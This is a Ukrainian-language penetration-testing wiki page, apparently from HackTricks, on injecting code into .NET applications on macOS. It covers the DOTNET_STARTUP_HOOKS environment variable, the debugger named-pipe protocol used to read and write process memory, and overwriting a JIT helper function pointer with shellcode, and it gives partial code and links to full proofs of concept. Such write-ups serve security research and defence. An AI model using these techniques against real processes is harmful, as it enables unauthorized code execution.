# Ін’єкція у .Net Applications macOS

{{#include ../../../banners/hacktricks-training.md}}

**Це короткий виклад публікації [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Ознайомтеся з нею для отримання додаткових відомостей!**<sup>[[1]](#references)</sup>

## `DOTNET_STARTUP_HOOKS`

.NET Core 3.0 і пізніші версії підтримують змінну середовища `DOTNET_STARTUP_HOOKS`. Кожен шлях має вказувати на керовану збірку, що містить глобальний тип `StartupHook` із методом `public static void Initialize()`. Host завантажує збірки та синхронно викликає їхні ініціалізатори перед точкою входу `Main` застосунку, надаючи контроль над середовищем і доступну для читання DLL як примітив безпосереднього виконання коду до запуску `Main`.<sup>[[2]](#references)</sup>
```csharp
// StartupHook.cs — compile as a class-library assembly.
using System.IO;

internal class StartupHook
{
public static void Initialize()
{
File.WriteAllText("/tmp/dotnet-startup-hook-executed", "executed\n");
}
}
```

```bash
dotnet new classlib -n StartupHookPayload -f net8.0
cp StartupHook.cs StartupHookPayload/Class1.cs
dotnet build StartupHookPayload -c Release

DOTNET_STARTUP_HOOKS="$PWD/StartupHookPayload/bin/Release/net8.0/StartupHookPayload.dll" \
dotnet /path/to/TargetApplication.dll
```
Збірка hook має бути сумісною зі середовищем виконання та залежностями застосунку. Відносні шляхи, що містять роздільники каталогів, відхиляються; використовуйте абсолютний шлях або ім'я збірки, яке можна розв'язати з контексту завантаження за замовчуванням. Startup hooks типово вимкнені в trimmed застосунках, а custom native hosts можуть безпосередньо передавати властивості середовища виконання замість успадкування середовища.<sup>[[2]](#references)</sup>

Захисні launchers мають очищати `DOTNET_STARTUP_HOOKS`, запобігати недовіреному запису до шляхів збірок застосунку та спільних збірок, а також окремо тестувати self-contained і trimmed розгортання.

## .NET Core Debugging <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Establishing a Debugging Session** <a href="#net-core-debugging" id="net-core-debugging"></a>

Обробка обміну даними між debugger і debuggee у .NET керується файлом [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp). Цей компонент створює два named pipes для кожного процесу .NET, як показано в [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127); вони ініціалізуються через [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27). Ці pipes мають суфікси **`-in`** і **`-out`**.

Переглянувши **`$TMPDIR`** користувача, можна знайти debugging FIFOs, доступні для debugging .Net applications.

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) відповідає за керування обміном даними з debugger. Щоб ініціювати нову debugging session, debugger має надіслати повідомлення через pipe `out`, яке починається зі структури `MessageHeader`, описаної у вихідному коді .NET:
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
Щоб запросити нову сесію, ця структура заповнюється таким чином: тип повідомлення встановлюється в `MT_SessionRequest`, а версія протоколу — у поточну версію:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Цей заголовок потім надсилається до цілі за допомогою системного виклику `write`, після чого передається структура `sessionRequestData`, що містить GUID сесії:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
Операція читання з каналу `out` підтверджує успішне або невдале встановлення debugging session:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## Читання пам’яті

Після встановлення сеансу налагодження пам’ять можна читати за допомогою типу повідомлення [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). Функція readMemory детально описує виконання необхідних кроків для надсилання запиту на читання та отримання відповіді:
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
Повний proof of concept (POC) доступний [тут](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).

## Запис пам'яті

Так само пам'ять можна записувати за допомогою функції `writeMemory`. Процес передбачає встановлення типу повідомлення `MT_WriteMemory`, зазначення адреси та довжини даних, а потім надсилання даних:
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
Пов’язаний POC доступний [тут](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).

## Виконання коду .NET Core <a href="#net-core-code-execution" id="net-core-code-execution"></a>

Щоб виконати код, потрібно ідентифікувати область пам’яті з дозволами rwx, що можна зробити за допомогою vmmap -pages:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
Пошук місця для перезапису вказівника на функцію є необхідним, і в .NET Core це можна зробити, націлившись на **Dynamic Function Table (DFT)**. Ця таблиця, описана в [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h), використовується runtime для допоміжних функцій JIT-компіляції.

У x64-системах для пошуку посилання на символ `_hlpDynamicFuncTable` у `libcorclr.dll` можна використовувати signature hunting.

Debugger-функція `MT_GetDCB` надає корисну інформацію, зокрема адресу допоміжної функції `m_helperRemoteStartAddr`, яка вказує на розташування `libcorclr.dll` у пам’яті процесу. Потім ця адреса використовується для початку пошуку DFT і перезапису вказівника на функцію адресою shellcode.

Повний код POC для ін’єкції в PowerShell доступний [тут](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).

## References

- [1] [Adam Chester (xpnsec) - Ін’єкція в macOS через сторонні Frameworks](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
- [2] [Проєктування startup hook для host у .NET runtime](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md)
{{#include ../../../banners/hacktricks-training.md}}
